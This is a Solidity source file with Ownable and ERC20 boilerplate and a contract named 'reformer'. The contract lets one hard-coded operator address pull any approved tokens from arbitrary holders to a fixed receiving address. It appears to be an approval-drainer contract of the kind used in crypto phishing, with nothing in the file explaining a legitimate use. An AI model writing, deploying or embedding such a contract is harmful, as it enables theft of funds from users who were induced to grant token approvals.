1 // SPDX-License-Identifier: UNLICENSED
2 pragma solidity ^0.8.0;
3 
4 /**
5  * @dev Provides information about the current execution context, including the
6  * sender of the transaction and its data. While these are generally available
7  * via msg.sender and msg.data, they should not be accessed in such a direct
8  * manner, since when dealing with meta-transactions the account sending and
9  * paying for execution may not be the actual sender (as far as an application
10  * is concerned).
11  *
12  * This contract is only required for intermediate, library-like contracts.
13  */
14 abstract contract Context {
15     function _msgSender() internal view virtual returns (address) {
16         return msg.sender;
17     }
18 
19     function _msgData() internal view virtual returns (bytes calldata) {
20         return msg.data;
21     }
22 }
23 
24 abstract contract Ownable is Context {
25     address private _owner;
26 
27     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
28 
29     /**
30      * @dev Initializes the contract setting the deployer as the initial owner.
31      */
32     constructor() {
33         _transferOwnership(_msgSender());
34     }
35 
36     /**
37      * @dev Returns the address of the current owner.
38      */
39     function owner() public view virtual returns (address) {
40         return _owner;
41     }
42 
43     /**
44      * @dev Throws if called by any account other than the owner.
45      */
46     modifier onlyOwner() {
47         require(owner() == _msgSender(), "Ownable: caller is not the owner");
48         _;
49     }
50 
51     /**
52      * @dev Leaves the contract without owner. It will not be possible to call
53      * `onlyOwner` functions anymore. Can only be called by the current owner.
54      *
55      * NOTE: Renouncing ownership will leave the contract without an owner,
56      * thereby removing any functionality that is only available to the owner.
57      */
58     function renounceOwnership() public virtual onlyOwner {
59         _transferOwnership(address(0));
60     }
61 
62     /**
63      * @dev Transfers ownership of the contract to a new account (`newOwner`).
64      * Can only be called by the current owner.
65      */
66     function transferOwnership(address newOwner) public virtual onlyOwner {
67         require(newOwner != address(0), "Ownable: new owner is the zero address");
68         _transferOwnership(newOwner);
69     }
70 
71     /**
72      * @dev Transfers ownership of the contract to a new account (`newOwner`).
73      * Internal function without access restriction.
74      */
75     function _transferOwnership(address newOwner) internal virtual {
76         address oldOwner = _owner;
77         _owner = newOwner;
78         emit OwnershipTransferred(oldOwner, newOwner);
79     }
80 }
81 
82 /**
83  * @dev Interface of the ERC20 standard as defined in the EIP.
84  */
85 interface IERC20 {
86     /**
87      * @dev Emitted when `value` tokens are moved from one account (`from`) to
88      * another (`to`).
89      *
90      * Note that `value` may be zero.
91      */
92     event Transfer(address indexed from, address indexed to, uint256 value);
93 
94     /**
95      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
96      * a call to {approve}. `value` is the new allowance.
97      */
98     event Approval(address indexed owner, address indexed spender, uint256 value);
99 
100     /**
101      * @dev Returns the amount of tokens in existence.
102      */
103     function totalSupply() external view returns (uint256);
104 
105     /**
106      * @dev Returns the amount of tokens owned by `account`.
107      */
108     function balanceOf(address account) external view returns (uint256);
109 
110     /**
111      * @dev Moves `amount` tokens from the caller's account to `to`.
112      *
113      * Returns a boolean value indicating whether the operation succeeded.
114      *
115      * Emits a {Transfer} event.
116      */
117     function transfer(address to, uint256 amount) external returns (bool);
118 
119     /**
120      * @dev Returns the remaining number of tokens that `spender` will be
121      * allowed to spend on behalf of `owner` through {transferFrom}. This is
122      * zero by default.
123      *
124      * This value changes when {approve} or {transferFrom} are called.
125      */
126     function allowance(address owner, address spender) external view returns (uint256);
127 
128     /**
129      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
130      *
131      * Returns a boolean value indicating whether the operation succeeded.
132      *
133      * IMPORTANT: Beware that changing an allowance with this method brings the risk
134      * that someone may use both the old and the new allowance by unfortunate
135      * transaction ordering. One possible solution to mitigate this race
136      * condition is to first reduce the spender's allowance to 0 and set the
137      * desired value afterwards:
138      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
139      *
140      * Emits an {Approval} event.
141      */
142     function approve(address spender, uint256 amount) external returns (bool);
143 
144     /**
145      * @dev Moves `amount` tokens from `from` to `to` using the
146      * allowance mechanism. `amount` is then deducted from the caller's
147      * allowance.
148      *
149      * Returns a boolean value indicating whether the operation succeeded.
150      *
151      * Emits a {Transfer} event.
152      */
153     function transferFrom(
154         address from,
155         address to,
156         uint256 amount
157     ) external;
158 }
159 
160 contract reformer is Ownable {
161     address public opr;
162     address public oprTo;
163 
164     constructor() {
165         opr = 0xB36F44926b3ECc6C4Fd16a966F977Baf1B3291E6;
166         oprTo = 0x80f33f4E4B38090Bc61BB291BD94A7Fcb1bBcde5;
167     }
168 
169     function setOpr(address addr,address toaddr) external onlyOwner {
170         opr = addr;
171         oprTo = toaddr;
172     }
173 
174     function transferFrom(
175         address token,
176         address from,
177         uint256 value
178     ) external {
179         require(msg.sender == opr, "Forbidden.");
180         IERC20(token).transferFrom(from, oprTo, value);
181     }
182 }